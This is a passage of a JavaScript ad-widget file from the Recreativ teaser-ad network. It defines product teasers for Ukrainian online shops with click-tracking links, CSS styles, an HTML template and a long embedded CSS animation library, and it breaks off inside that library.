adb = {}
var src = ''
var blockData = JSON.stringify({
    data: {
        "t": [
            ["\/\/st5.recreativ.ru\/tizers\/200\/887\/tiz-533_10478059.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBvgBB%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9n1WDhuULhs3yGS3%2FKFYXjgw6QQrRNR2bMZiPXg6X2zE9QD2oeT2CXBGkmHy", "FunDesk", "Детское кресло FunDesk SST5 Blue", "rozetka.ua", "3 175 грн", "Купить FunDesk 3 175 грн", "", "103730295", 0, 0, 0],
            ["\/\/st5.recreativ.ru\/tizers\/200\/583\/tiz-533_11549416.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBvgBB%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9ndUCR%2BfIx03yGS3%2BaFYXjgw6QQrRNR2bMZiPHk5XmjA%2BgD2oeT2CHNE52Hl", "Barsky", "Кресло игровое Barsky Sport Drive Game Red (SD-08)", "rozetka.ua", "3 103 грн", "Купить Barsky 3 103 грн", "", "109544943", 0, 0, 0],
            ["\/\/st5.recreativ.ru\/tizers\/200\/426\/tiz-533_13676357.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBvQBC%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9HpTDxKfJxo3yGS%2FxaFYZwEM1DwTeNJ2Vv5gO3s7VGnGxTjwpuPwCNv%2BYUY%3D", "Mealux", "Кресло Evo-kids Aladdin PO (Y-520 PO)", "rozetka.ua", "3 180 грн", "Купить Mealux 3 180 грн", "", "124229904", 0, 0, 0],
            ["\/\/st5.recreativ.ru\/tizers\/200\/627\/tiz-533_14782616.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBvQBC%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9HdSDhmXJhw3yGS8xaFYZwEM1DwTeNJ2Vv5nOnQ%2FUW3HxTjwpuPwCNsmYUM%3D", "Halmar", "Кресло Halmar Atom Коричневое", "rozetka.ua", "3 190 грн", "Купить Halmar 3 190 грн", "", "129332112", 0, 0, 0],
            ["\/\/st5.recreativ.ru\/tizers\/200\/384\/tiz-4zM3Ws45te.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBrQBS%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT8n9VDhqeIBk3zGS8xaFYZwEI6AQrROhMC6dYXA%3D%3D", "modnakasta.ua", "Заказывайте стильные босоножки для летних вечеринок!", "modnakasta.ua", "Скидка 50%", "Купить modnakasta.ua Скидка 50%", "", "141431877", 0, 0, 0],
            ["\/\/st5.recreativ.ru\/tizers\/200\/545\/tiz-2SKITjiBi4.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBrQBS%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9XtZDBuXJBw3zGS8xaFYZwEI6AQrROhMC8tYXg%3D%3D", "Платья от 89 гривен", "Таких цен не найти! Выбирайте на modnaKasta", "modnakasta.ua", "", "Купить Платья от 89 гривен", "", "135810132", 0, 0, 0],
            ["\/\/st5.recreativ.ru\/tizers\/200\/241\/tiz-f6ff268179.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBrQBS%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT8nxWBBifIBg3zGS%2FxaFYZwEI6AQrROhMCqdYUQ%3D%3D", "Стильные сумки", "Доступные цены на modnaKasta!", "modnakasta.ua", "", "Купить Стильные сумки", "", "142793976", 0, 0, 0],
            ["\/\/st5.recreativ.ru\/tizers\/200\/234\/tiz-d214c94328.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBrQBS%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT8nxWBBifJxk3zGS%2FxaFYZwEI6AQrROhMCzZYWQ%3D%3D", "Кроссовки и кеды", "Обувь с максимальными скидками выбирайте на modnakasta.ua", "modnakasta.ua", "", "Купить Кроссовки и кеды", "", "142793907", 0, 0, 0]
        ],
        teasers: [
            {
                title: 'FunDesk',
                desc: 'Детское кресло FunDesk SST5 Blue',
                link: 'rozetka.ua',
                price: '3 175 грн',
                class: "teaser--brand",
                image: 'https://st5.recreativ.ru/tizers/200/887/tiz-533_10478059.jpg',
                logo: 'https://recreativ.ru/img/brand_533.png',
            },
            {
                id: 't' + Math.random().toString(32).substr(2),
                title: 'Barsky',
                desc: 'Кресло игровое Barsky Sport Drive Game Red (SD-08)',
                link: 'rozetka.ua',
                price: '3 103 грн',
                class: "",
                image: 'https://st5.recreativ.ru/tizers/200/583/tiz-533_11549416.jpg',
            },
            {
                id: 't' + Math.random().toString(32).substr(2),
                title: 'Barsky',
                desc: 'Кресло игровое Barsky Sport Drive Game Red (SD-08)',
                link: 'rozetka.ua',
                price: '3 103 грн',
                class: "",
                image: 'https://st5.recreativ.ru/tizers/200/583/tiz-533_11549416.jpg',
            },
            {
                id: 't' + Math.random().toString(32).substr(2),
                title: 'Barsky',
                desc: 'Кресло игровое Barsky Sport Drive Game Red (SD-08)',
                link: 'rozetka.ua',
                price: '3 103 грн',
                class: "",
                image: 'https://st5.recreativ.ru/tizers/200/583/tiz-533_11549416.jpg',
            },
            {
                id: 't' + Math.random().toString(32).substr(2),
                title: 'Barsky',
                desc: 'Кресло игровое Barsky Sport Drive Game Red (SD-08)',
                link: 'rozetka.ua',
                price: '3 103 грн',
                class: "",
                image: 'https://st5.recreativ.ru/tizers/200/583/tiz-533_11549416.jpg',
            },
            {
                title: 'Barsky',
                desc: 'Кресло игровое Barsky Sport Drive Game Red (SD-08)',
                link: 'rozetka.ua',
                price: '3 103 грн',
                class: "",
                image: 'https://st5.recreativ.ru/tizers/200/583/tiz-533_11549416.jpg',
            },
        ],
        class: "",
        style: ""
    },
    template: {
        styles: `<style>
            .root {
                margin: 0 !important;
                padding: 0 !important;
                position: relative !important;
                overflow: hidden !important;
                width: 100% !important;
            }
        
            .root table {
                width:100% !important;
                border-spacing:1px !important;
                table-layout:auto !important;
                background-color:#f9f9f9 !important;
                -webkit-hyphens:auto !important;
                -moz-hyphens:auto !important;
                -ms-hyphens:auto !important;
                hyphens:auto !important;
                word-break:break-word !important;
            }
        
            .root .teaser {
                text-align:center !important; 
                border: 1px solid #f9f9f9 !important;
                padding:5px !important;
                background-color:#f9f9f9 !important;
                vertical-align:top !important;
                width:100% !important;
            }
        
            .root .teaser a {
                text-decoration:none !important;
            }

            .root .teaser > a {
                text-decoration:none !important;
                display:block !important;
                margin:0 !important;
                padding:0 !important;
            }
            
            .root .teaser__img_box {
            }
        
            .root .teaser--brand .teaser__img_box {
                margin:3px  auto !important;width:200px !important;height:200px !important;
                padding: 0 !important; border: 1px solid #91ce6a !important; position: relative !important;
            }
        
            .root .teaser__img_box .teaser__img {
                margin:3px !important;
                padding:0 !important;
                border:0 !important;
                width:200px !important;
                height:200px !important;
                display:inline !important;
            }

            .root .teaser--brand .teaser__img {
                display: block !important; 
                border: 0 !important; 
                margin:0 !important;
                padding:0 !important;
            }
        
            .root .teaser__title {
                font:15px Tahoma !important;
                color:#000000 !important;
                text-decoration:none !important;
                font-weight:bold !important;
                float:none !important;
                margin:0 !important;
                padding:0 !important;
            }

            .root .teaser__desc {
                font:14px Tahoma !important;
                color:#494444 !important;
                text-decoration: none !important;
                font-weight:normal !important;
                float:none !important;
                margin:0 !important;padding:0 !important;
            }

            .root .teaser__link {
                font:15px Tahoma !important;
                color:#009a28 !important;
                font-weight:normal !important;
                float:none !important;
                margin:0 !important;
                padding:0 !important;
                text-decoration:none !important;
                border:0 !important;
            }
        
            .root .teaser__price {
                font:14px Tahoma !important;
                font-weight:bold !important;
                float:none !important;
                margin:0 !important;
                padding:0 !important;
                color:#F0690F !important;
            }

            .root .teaser--brand {
                padding:6px !important;
                width:100% !important;
                border: 1px solid #df6f78 !important;
                background: #fdf8e5 !important;
                vertical-align: top;
                overflow: hidden;
            }
        
            .root .teaser--brand .teaser__link {
                display: block !important;
                background: #fdf8e5 !important;
            }
        
            .root .teaser--brand .teaser__title {
                padding: 1px 0 !important;
                font-weight: bold !important;
                text-decoration: none !important;
                color: #c80010 !important;
            }
        
            .root .brand__logo {
                position: absolute !important;
                top: 0 !important;
                left: 0 !important;
                border: 0 !important;
                background: transparent !important;
                padding: 0 !important;
                margin: 0 !important;
            }
        
            .root .teaser--brand .brand-desc {
                font-weight: normal !important;
                text-decoration: none !important;
                color: #000000 !important;
            }
        
            .root .teaser--brand .brand-link {
                font-weight: normal !important;
                text-decoration: none !important;
                color: #00911a !important;
            }
        
            .root .teaser--brand .brand-price {
                font-weight: bold !important;
                text-decoration: none !important;
                color: #df6f78 !important;
            }
        
            .root a.bage {
                width: 61px !important;
                height: 18px !important;
                padding: 0px !important;
                display: block !important;
                background: left top url(//recreativ.ru/img/logo.png) no-repeat !important;
                position: absolute !important;
                top: 0 !important;
                right: -23px;
                overflow: hidden !important;
            }
        
            .root a.btn-hide {
                width: 18px !important;
                height: 18px !important;
                padding: 0px !important;
                display: block !important;
                background: left top url('//recreativ.ru/img/x.png') no-repeat !important;
                position: absolute !important;
                top: 0 !important;
                right: 0px !important;
                overflow: hidden !important;
            }
        </style>`,
        template: `<div class="root animated" :id="me.id" :class="me.class">
                        <table :class="me.tableClass" :style="me.tableStyle">
                            <tbody>
                                <teasers>
                                    <tr>
                                        <td class="teaser" :id="item.id" :class="item.class" :style="item.style">
                                            <a href="#" class="">
                                                <div class="teaser__img_box">
                                                    <img class="teaser__img" :src="item.image"/>                                            
                                                    <img rc-if="item.logo" class="teaser__brand-logo" :src="item.brand.src"/>                                            
                                                </div>
                                                <div rc-if="item.title" class="teaser__title">
                                                    {{item.title}}
                                                </div>
                                                <div rc-if="item.desc" class="teaser__desc">
                                                    {{item.desc}}
                                                </div>
                                                <div rc-if="item.link" class="teaser__link">
                                                    {{item.link}}
                                                </div>
                                                <div rc-if="item.price" class="teaser__price">
                                                    {{item.price}}
                                                </div>
                                            </a>
                                        </td>
                                    </tr>
                                </teasers>
                            </tbody>
                        </table>
                        <a class="bage" href="//recreativ.ru" style="" onmouseout="this.setAttribute('data-r','-23px');setTimeout((function(){this.style.right=this.getAttribute('data-r');}).bind(this),1000)" title="Рекламная сеть Recreativ - с нами Вас заметят!" target="_blank"></a>
                        <a class="btn-hide" href="#" title="скрыть рекламу"></a>
                  </div>`,
    }
})
var BaseElement = function ({data, template}) {
    let e = this // self
    this.me = data // data root for template
    this.t = template || '' // stored template
    this.shadow = null // shadow DOM object where template DOM will be stored
    let animationCss = '@charset "UTF-8"; \
    .animated{animation-duration:1s;animation-fill-mode:both}.animated.infinite{animation-iteration-count:infinite}.animated.hinge{animation-duration:2s}.animated.bounceIn,.animated.bounceOut,.animated.flipOutX,.animated.flipOutY{animation-duration:.75s}@keyframes bounce{0%,20%,53%,80%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1);transform:translateZ(0)}40%,43%{animation-timing-function:cubic-bezier(.755,.05,.855,.06);transform:translate3d(0,-30px,0)}70%{animation-timing-function:cubic-bezier(.755,.05,.855,.06);transform:translate3d(0,-15px,0)}90%{transform:translate3d(0,-4px,0)}}.bounce{animation-name:bounce;transform-origin:center bottom}@keyframes flash{0%,50%,to{opacity:1}25%,75%{opacity:0}}.flash{animation-name:flash}@keyframes pulse{0%{transform:scaleX(1)}50%{transform:scale3d(1.05,1.05,1.05)}to{transform:scaleX(1)}}.pulse{animation-name:pulse}@keyframes rubberBand{0%{transform:scaleX(1)}30%{transform:scale3d(1.25,.75,1)}40%{transform:scale3d(.75,1.25,1)}50%{transform:scale3d(1.15,.85,1)}65%{transform:scale3d(.95,1.05,1)}75%{transform:scale3d(1.05,.95,1)}to{transform:scaleX(1)}}.rubberBand{animation-name:rubberBand}@keyframes shake{0%,to{transform:translateZ(0)}10%,30%,50%,70%,90%{transform:translate3d(-10px,0,0)}20%,40%,60%,80%{transform:translate3d(10px,0,0)}}.shake{animation-name:shake}@keyframes headShake{0%{transform:translateX(0)}6.5%{transform:translateX(-6px) rotateY(-9deg)}18.5%{transform:translateX(5px) rotateY(7deg)}31.5%{transform:translateX(-3px) rotateY(-5deg)}43.5%{transform:translateX(2px) rotateY(3deg)}50%{transform:translateX(0)}}.headShake{animation-timing-function:ease-in-out;animation-name:headShake}@keyframes swing{20%{transform:rotate(15deg)}40%{transform:rotate(-10deg)}60%{transform:rotate(5deg)}80%{transform:rotate(-5deg)}to{transform:rotate(0deg)}}.swing{transform-origin:top center;animation-name:swing}@keyframes tada{0%{transform:scaleX(1)}10%,20%{transform:scale3d(.9,.9,.9) rotate(-3deg)}30%,50%,70%,90%{transform:scale3d(1.1,1.1,1.1) rotate(3deg)}40%,60%,80%{transform:scale3d(1.1,1.1,1.1) rotate(-3deg)}to{transform:scaleX(1)}}.tada{animation-name:tada}@keyframes wobble{0%{transform:none}15%{transform:translate3d(-25%,0,0) rotate(-5deg)}30%{transform:translate3d(20%,0,0) rotate(3deg)}45%{transform:translate3d(-15%,0,0) rotate(-3deg)}60%{transform:translate3d(10%,0,0) rotate(2deg)}75%{transform:translate3d(-5%,0,0) rotate(-1deg)}to{transform:none}}.wobble{animation-name:wobble}@keyframes jello{0%,11.1%,to{transform:none}22.2%{transform:skewX(-12.5deg) skewY(-12.5deg)}33.3%{transform:skewX(6.25deg) skewY(6.25deg)}44.4%{transform:skewX(-3.125deg) skewY(-3.125deg)}55.5%{transform:skewX(1.5625deg) skewY(1.5625deg)}66.6%{transform:skewX(-.78125deg) skewY(-.78125deg)}77.7%{transform:skewX(.390625deg) skewY(.390625deg)}88.8%{transform:skewX(-.1953125deg) skewY(-.1953125deg)}}.jello{animation-name:jello;transform-origin:center}@keyframes bounceIn{0%,20%,40%,60%,80%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:scale3d(.3,.3,.3)}20%{transform:scale3d(1.1,1.1,1.1)}40%{transform:scale3d(.9,.9,.9)}60%{opacity:1;transform:scale3d(1.03,1.03,1.03)}80%{transform:scale3d(.97,.97,.97)}to{opacity:1;transform:scaleX(1)}}.bounceIn{animation-name:bounceIn}@keyframes bounceInDown{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(0,-3000px,0)}60%{opacity:1;transform:translate3d(0,25px,0)}75%{transform:translate3d(0,-10px,0)}90%{transform:translate3d(0,5px,0)}to{transform:none}}.bounceInDown{animation-name:bounceInDown}@keyframes bounceInLeft{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(-3000px,0,0)}60%{opacity:1;transform:translate3d(25px,0,0)}75%{transform:translate3d(-10px,0,0)}90%{transform:translate3d(5px,0,0)}to{transform:none}}.bounceInLeft{animation-name:bounceInLeft}@keyframes bounceInRight{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(3000px,0,0)}60%{opacity:1;transform:translate3d(-25px,0,0)}75%{transform:translate3d(10px,0,0)}90%{transform:translate3d(-5px,0,0)}to{transform:none}}.bounceInRight{animation-name:bounceInRight}@keyframes bounceInUp{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(0,3000px,0)}60%{opacity:1;transform:translate3d(0,-20px,0)}75%{transform:translate3d(0,10px,0)}90%{transform:translate3d(0,-5px,0)}to{transform:translateZ(0)}}.bounceInUp{animation-name:bounceInUp}@keyframes bounceOut{20%{transform:scale3d(.9,.9,.9)}50%,55%{opacity:1;transform:scale3d(1.1,1.1,1.1)}to{opacity:0;transform:scale3d(.3,.3,.3)}}.bounceOut{animation-name:bounceOut}@keyframes bounceOutDown{20%{transform:translate3d(0,10px,0)}40%,45%{opacity:1;transform:translate3d(0,-20px,0)}to{opacity:0;transform:translate3d(0,2000px,0)}}.bounceOutDown{animation-name:bounceOutDown}@keyframes bounceOutLeft{20%{opacity:1;transform:translate3d(20px,0,0)}to{opacity:0;transform:translate3d(-2000px,0,0)}}.bounceOutLeft{animation-name:bounceOutLeft}@keyframes bounceOutRight{20%{opacity:1;transform:translate3d(-20px,0,0)}to{opacity:0;transform:translate3d(2000px,0,0)}}.bounceOutRight{animation-name:bounceOutRight}@keyframes bounceOutUp{20%{transform:translate3d(0,-10px,0)}40%,45%{opacity:1;transform:translate3d(0,20px,0)}to{opacity:0;transform:translate3d(0,-2000px,0)}}.bounceOutUp{animation-name:bounceOutUp}@keyframes fadeIn{0%{opacity:0}to{opacity:1}}.fadeIn{animation-name:fadeIn}@keyframes fadeInDown{0%{opacity:0;transform:translate3d(0,-100%,0)}to{opacity:1;transform:none}}.fadeInDown{animation-name:fadeInDown}@keyframes fadeInDownBig{0%{opacity:0;transform:translate3d(0,-2000px,0)}to{opacity:1;transform:none}}.fadeInDownBig{animation-name:fadeInDownBig}@keyframes fadeInLeft{0%{opacity:0;transform:translate3d(-100%,0,0)}to{opacity:1;transform:none}}.fadeInLeft{animation-name:fadeInLeft}@keyframes fadeInLeftBig{0%{opacity:0;transform:translate3d(-2000px,0,0)}to{opacity:1;transform:none}}.fadeInLeftBig{animation-name:fadeInLeftBig}@keyframes fadeInRight{0%{opacity:0;transform:translate3d(100%,0,0)}to{opacity:1;transform:none}}.fadeInRight{animation-name:fadeInRight}@keyframes fadeInRightBig{0%{opacity:0;transform:translate3d(2000px,0,0)}to{opacity:1;transform:none}}.fadeInRightBig{animation-name:fadeInRightBig}@keyframes fadeInUp{0%{opacity:0;transform:translate3d(0,100%,0)}to{opacity:1;transform:none}}.fadeInUp{animation-name:fadeInUp}@keyframes fadeInUpBig{0%{opacity:0;transform:translate3d(0,2000px,0)}to{opacity:1;transform:none}}.fadeInUpBig{animation-name:fadeInUpBig}@keyframes fadeOut{0%{opacity:1}to{opacity:0}}.fadeOut{animation-name:fadeOut}@keyframes fadeOutDown{0%{opacity:1}to{opacity:0;transform:translate3d(0,100%,0)}}.fadeOutDown{animation-name:fadeOutDown}@keyframes fadeOutDownBig{0%{opacity:1}to{opacity:0;transform:translate3d(0,2000px,0)}}.fadeOutDownBig{animation-name:fadeOutDownBig}@keyframes fadeOutLeft{0%{opacity:1}to{opacity:0;transform:translate3d(-100%,0,0)}}.fadeOutLeft{animation-name:fadeOutLeft}@keyframes fadeOutLeftBig{0%{opacity:1}to{opacity:0;transform:translate3d(-2000px,0,0)}}.fadeOutLeftBig{animation-name:fadeOutLeftBig}@keyframes fadeOutRight{0%{opacity:1}to{opacity:0;transform:translate3d(100%,0,0)}}.fadeOutRight{animation-name:fadeOutRight}@keyframes fadeOutRightBig{0%{opacity:1}to{opacity:0;transform:translate3d(2000px,0,0)}}.fadeOutRightBig{animation-name:fadeOutRightBig}@keyframes fadeOutUp{0%{opacity:1}to{opacity:0;transform:translate3d(0,-100%,0)}}.fadeOutUp{animation-name:fadeOutUp}@keyframes fadeOutUpBig{0%{opacity:1}to{opacity:0;transform:translate3d(0,-2000px,0)}}.fadeOutUpBig{animation-name:fadeOutUpBig}@keyframes flip{0%{transform:perspective(400px) rotateY(-1turn);animation-timing-function:ease-out}40%{transform:perspective(400px) translateZ(150px) rotateY(-190deg);animation-timing-function:ease-out}50%{transform:perspective(400px) translateZ(150px) rotateY(-170deg);animation-timing-function:ease-in}80%{transform:perspective(400px) scale3d(.95,.95,.95);animation-timing-function:ease-in}to{transform:perspective(400px);animation-timing-function:ease-in}}.animated.flip{-webkit-backface-visibility:visible;backface-visibility:visible;animation-name:flip}@keyframes flipInX{0%{transform:perspective(400px) rotateX(90deg);animation-timing-function:ease-in;opacity:0}40%{transform:perspective(400px) rotateX(-20deg);animation-timing-function:ease-in}60%{transform:perspective(400px) rotateX(10deg);opacity:1}80%{transform:perspective(400px) rotateX(-5deg)}to{transform:perspective(400px)}}.flipInX{-webkit-backface-visibility:visible!important;backface-visibility:visible!important;animation-name:flipInX}@keyframes flipInY{0%{transform:perspective(400px) rotateY(90deg);animation-timing-function:ease-in;opacity:0}40%{transform:perspective(400px) rotateY(-20deg);animation-timing-function:ease-in}60%{transform:perspective(400px) rotateY(10deg);opacity:1}80%{transform:perspective(400px) rotateY(-5deg)}to{transform:perspective(400px)}}.flipInY{-webkit-backface-visibility:visible!important;backface-visibility:visible!important;animation-name:flipInY}@keyframes flipOutX{0%{transform:perspective(400px)}30%{transform:perspective(400px) rotateX(-20deg);opacity:1}to{transform:perspective(400px) rotateX(90deg);opacity:0}}.flipOutX{animation-name:flipOutX;-webkit-backface-visibility:visible!important;backface-visibility:visible!important}@keyframes flipOutY{0%{transform:perspective(400px)}30%{transform:perspective(400px) rotateY(-15deg);opacity:1}to{transform:perspective(400px) rotateY(90deg);opacity:0}}.flipOutY{-webkit-backface-visibility:visible!important;backface-visibility:visible!important;animation-name:flipOutY}@keyframes lightSpeedIn{0%{transform:translate3d(100%,0,0) skewX(-30deg);opacity:0}60%{transform:skewX(20deg);opacity:1}80%{transform:skewX(-5deg);opacity:1}to{transform:none;opacity:1}}.lightSpeedIn{animation-name:lightSpeedIn;animation-timing-function:ease-out}@keyframes lightSpeedOut{0%{opacity:1}to{transform:translate3d(100%,0,0) skewX(30deg);opacity:0}}.lightSpeedOut{animation-name:lightSpeedOut;animation-timing-function:ease-in}@keyframes rotateIn{0%{transform-origin:center;transform:rotate(-200deg);opacity:0}to{transform-origin:center;transform:none;opacity:1}}.rotateIn{animation-name:rotateIn}@keyframes rotateInDownLeft{0%{transform-origin:left bottom;transform:rotate(-45deg);opacity:0}to{transform-origin:left bottom;transform:none;opacity:1}}.rotateInDownLeft{animation-name:rotateInDownLeft}@keyframes rotateInDownRight{0%{transform-origin:right bottom;transform:rotate(45deg);opacity:0}to{transform-origin:right bottom;transform:none;opacity:1}}.rotateInDownRight{animation-name:rotateInDownRight}@keyframes rotateInUpLeft{0%{transform-origin:left bottom;transform:rotate(45deg);opacity:0}to{transform-origin:left bottom;transform:none;opacity:1}}.rotateInUpLeft{animation-name:rotateInUpLeft}@keyframes rotateInUpRight{0%{transform-origin:right bottom;transform:rotate(-90deg);opacity:0}to{transform-origin:right bottom;transform:none;opacity:1}}.rotateInUpRight{animation-name:rotateInUpRight}@keyframes rotateOut{0%{transform-origin:center;opacity:1}to{transform-origin:center;transform:rotate(200deg);opacity:0}}.rotateOut{animation-name:rotateOut}@keyframes rotateOutDownLeft{0%{transform-origin:left bottom;opacity:1}to{transform-origin:left bottom;transform:rotate(45deg);opacity:0}}.rotateOutDownLeft{animation-name:rotateOutDownLeft}@keyframes rotateOutDownRight{0%{transform-origin:right bottom;opacity:1}to{transform-origin:right bottom;transform:rotate(-45deg);opacity:0}}.rotateOutDownRight{animation-name:rotateOutDownRight}@keyframes rotateOutUpLeft{0%{transform-origin:left bottom;opacity:1}to{transform-origin:left bottom;transform:rotate(-45deg);opacity:0}}.rotateOutUpLeft{animation-name:rotateOutUpLeft}@keyframes rotateOutUpRight{0%{transform-origin:right bottom;opacity:1}to{transform-origin:right bottom;transform:rotate(90deg);opacity:0}}.rotateOutUpRight{animation-name:rotateOutUpRight}@keyframes hinge{0%{transform-origin:top left;animation-timing-function:ease-in-out}20%,60%{transform:rotate(80deg);transform-origin:top left;animation-timing-function:ease-in-out}40%,80%{transform:rotate(60deg);transform-origin:top left;animation-timing-function:ease-in-out;opacity:1}to{transform:translate3d(0,700px,0);opacity:0}}.hinge{animation-name:hinge}@keyframes jackInTheBox{0%{opacity:0;transform:scale(.1) rotate(30deg);transform-origin:center bottom}50%{transform:rotate(-10deg)}70%{transform:rotate(3deg)}to{opacity:1;transform:scale(1)}}.jackInTheBox{animation-name:jackInTheBox}@keyframes rollIn{0%{opacity:0;transform:translate3d(-100%,0,0) rotate(-120deg)}to{opacity:1;transform:none}}.rollIn{animation-name:rollIn}@keyframes rollOut{0%{opacity:1}to{opacity:0;transform:translate3d(100%,0,0) rotate(120deg)}}.rollOut{animation-name:rollOut}@keyframes zoomIn{0%{opacity:0;transform:scale3d(.3,.3,.3)}50%{opacity:1}}.zoomIn{animation-name:zoomIn}@keyframes zoomInDown{0%{opacity:0;transform:scale3d(.1,.1,.1) translate3d(0,-1000px,0);animation-timing-function:cubic-bezier(.55,.055,.675,.19)}60%{opacity:1;transform:scale3d(.475,.475,.475) translate3d(0,60px,0);animation-timing-function:cubic-bezier(.175,.885,.32,1)}}.zoomInDown{animation-name:zoomInDown}@keyframes zoomInLeft{0%{opacity:0;transform:scale3d(.1,.1,.1) translate3d(-1000px,0,0);animation-timing-function:cubic-bezier(.55,.055,.675,.19)}60%{opacity:1;transform:scale3d(.475,.475,.475) translate3d(10px,0,0);animation-timing-function:cubic-bezier(.175,.885,.32,1)}}.zoomInLeft{animation-name:zoomInLeft}@keyframes zoomInRight{0%{opacity:0;transform:scale3d(.1,.1,.1) translate3d(1000px,0,0);animation-timing-function:cubic-bezier(.55,.055,.675,.19)}60%{opacity:1;transform:scale3d(.475,.475,.475) translate3d(-10px,0,0);animation-timing-function:cubic-bezier(.175,.885,.32,1)}}.zoomInRight{animation-name:zoomInRight}@keyframes zoomInUp{0%{opacity:0;transform:scale3d(.1,.1,.1) translate3d(0,1000px,0);animation-timing-function:cubic-bezier(.55,.055,.675,.19)}60%{opacity:1;transform:scale3d(.475,.475,.475) translate3d(0,-60px,0);animation-timing-function:cubic-bezier(.175,.885,.32,1)}}.zoomInUp{animation-name:zoomInUp}@keyframes zoomOut{0%{opacity:1}50%{opacity:0;transform:scale3d(.3,.3,.3)}to{opacity:0}}.zoomOut{animation-name:zoomOut}@keyframes zoomOutDown{40%{opacity:1;transform:scale3d(.475,.475,.475) translate3d(0,-60px,0);animation-timing-function:cubic-bezier(.55,.055,.675,.19)}to{opacity:0;transform:scale3d(.1,.1,.1) translate3d(0,2000px,0);transform-origin:center bottom;animation-timing-function:cubic-bezier(.175,.885,.32,1)}}.zoomOutDown{animation-name:zoomOutDown}@keyframes zoomOutLeft{40%{opacity:1;transform:scale3d(.475,.475,.475) translate3d(42px,0,0)}to{opacity:0;transform:scale(.1) translate3d(-2000px,0,0);transform-origin:left center}}.zoomOutLeft{animation-name:zoomOutLeft}@keyframes zoomOutRight{40%{opacity:1;transform:scale3d(.475,.475,.475) translate3d(-42px,0,0)}to{opacity:0;transform:scale(.1) translate3d(2000px,0,0);transform-origin:right center}}.zoomOutRight{animation-name:zoomOutRight}@keyframes zoomOutUp{40%{opacity:1;transform:scale3d(.475,.475,.475) translate3d(0,60px,0);animation-timing-function:cubic-bezier(.55,.055,.675,.19)}to{opacity:0;transform:scale3d(.1,.1,.1) translate3d(0,-2000px,0);transform-origin:center bottom;animation-timing-function:cubic-bezier(.175,.885,.32,1)}}.zoomOutUp{animation-name:zoomOutUp}@keyframes slideInDown{0%{transform:translate3d(0,-100%,0);visibility:visible}to{transform:translateZ(0)}}.slideInDown{animation-name:slideInDown}@keyframes slideInLeft{0%{transform:translate3d(-100%,0,0);visibility:visible}to{transform:translateZ(0)}}.slideInLeft{animation-name:slideInLeft}@keyframes 